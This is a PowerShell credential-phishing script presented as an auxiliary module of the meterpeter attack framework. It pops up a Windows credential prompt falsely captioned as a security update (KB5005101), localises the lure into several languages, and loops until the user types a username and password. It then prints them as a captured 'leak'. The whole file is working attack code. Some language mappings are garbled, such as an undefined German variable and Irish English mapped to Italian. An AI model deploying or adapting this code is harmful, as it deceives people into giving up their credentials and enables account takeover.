<#
.SYNOPSIS
   Prompt the current user for a valid credential.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.13 that triggers 'PromptForCredential'
   dialogBox in the hope that target user enters is credentials to leak them.

.NOTES
   Supported languages: pt-PT,en-AU,pt-BZ,pt-BR,en-IE,de-AT,de-FR,eu-ES,nl,nl-BQ,en-ID,id-ID,jv-ID

.EXAMPLE
   PS C:\> .\PhishCreds.ps1

.INPUTS
   None. You cannot pipe objects into PhishCreds.ps1

.OUTPUTS
Waiting for user input ..


Date        Username Password
----        -------- --------
06/12/2023  ubuntu   s3cr3t
#>


write-host ""
function Await($WinRtTask, $ResultType)
{
   $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
   $netTask = $asTask.Invoke($null, @($WinRtTask))
   $netTask.Wait(-1)|Out-Null
   $netTask.Result
}

## Supported languages
$message_ho = "Voer gebruikersgegevens in"
$message_id = "Masukkan kredensial pengguna"
$message_en = "Please enter user credentials"
$message_it = "Inserire le credenziali dell'utente"
$message_ge = "Bitte geben Sie Ihre Anmeldedaten ein"
$message_pt = "Introduzir as credenciais de utilizador"
$message_sp = "Por favor, introduzca sus credenciales de usuario"
$message_fr = "Veuillez saisir les informations d'identification de l'utilisateur"

$TargetArch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$caption_en = "Security update KB5005101 - $TargetArch"
$caption_ge = "Sicherheitsupdate KB5005101 - $TargetArch"
$caption_id = "Pembaruan keamanan KB5005101 - $TargetArch"
$caption_ho = "Beveiligingsupdate KB5005101 - $TargetArch"
$caption_pt = "Update de segurança KB5005101 - $TargetArch"
$caption_fr = "Mise à jour de sécurité KB5005101 - $TargetArch"
$caption_sp = "Actualización de seguridad KB5005101 - $TargetArch"
$caption_it = "Aggiornamento di sicurezza KB5005101 - $TargetArch"

## Get the first installed language with Get-WinUserLanguageList
# if no supported language is found the script will use English.
$language = $(Get-WinUserLanguageList)[0].LanguageTag
If($language -match 'en-AU')
{
   $message = $message_en
   $caption = $caption_en
}
ElseIf(($language -match 'pt-PT') -or ($language -match 'pt-BZ') -or ($language -match 'pt-BR'))
{
   $message = $message_pt
   $caption = $caption_pt
}
ElseIf($language -match 'en-IE')
{
   $message = $message_it
   $caption = $caption_it
}
ElseIf($language -match 'de-AT')
{
   $message = $message_de
   $caption = $caption_de
}
ElseIf($language -match 'de-FR')
{
   $message = $message_fr
   $caption = $caption_fr
}
ElseIf($language -match 'eu-ES')
{
   $message = $message_sp
   $caption = $caption_sp
}
ElseIf(($language -match 'nl') -or ($language -match 'nl-BQ'))
{
   $message = $message_ho
   $caption = $caption_ho
}
ElseIf(($language -match 'en-ID') -or ($language -match 'id-ID') -or ($language -match 'jv-ID'))
{
   $message = $message_id
   $caption = $caption_id
}
Else
{
   $message = $message_en
   $caption = $caption_en
}

# This script currently only works on powershell 5
If((Get-Host).Version.Major -ne 5)
{
   # downgrade
   powershell -Version 5 -File $MyInvocation.MyCommand.Definition
   exit
}

# Add assemblies
$null = [Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials,ContentType=WindowsRuntime]
$null = [Windows.UI.Popups.MessageDialog,Windows.UI.Popups,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.AdaptiveTrigger,Windows.UI.Xaml,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.Controls.AppBar,Windows.UI.Xaml.Controls,ContentType=WindowsRuntime]
$null = Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods()|?{ $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]

# Set the window options
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.TargetName = "Microsoft Windows"
$options.AuthenticationProtocol = [Windows.Security.Credentials.UI.AuthenticationProtocol]::Basic
$options.CredentialSaveOption = [Windows.Security.Credentials.UI.CredentialSaveOption]::Unselected
$options.Caption = $caption
$options.Message = $message

while($True)
{
   Write-Host "Waiting for user input ..`n" -ForegroundColor Green
   $creds = Await $([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])

   If([string]::isnullorempty($creds.CredentialPassword))
   {
      write-host "Password field was empty!" -ForegroundColor Red
      continue
   }
   Elseif([string]::isnullorempty($creds.CredentialUserName))
   {
      write-host "Username field was empty!" -ForegroundColor Red
      continue
   }
   Else
   {
      $dateme = (Get-Date).Date
      $pass = $creds.CredentialPassword
      $username = $creds.CredentialUserName
      $Sanitize = ($dateme) -replace '00:00:00',''

      ## Format the leak into a table object
      $table = New-Object System.Data.DataTable
      $table.Columns.Add("Date")|Out-Null
      $table.Columns.Add("Username")|Out-Null
      $table.Columns.Add("Password")|Out-Null

      ## Adding values to table object
      $table.Rows.Add("$Sanitize",  ## Date
                      "$username",  ## Username
                      "$pass"       ## password
      )|Out-Null

      ## Display Table
      $table|Format-Table -AutoSize
      break # Break loop function
   }
}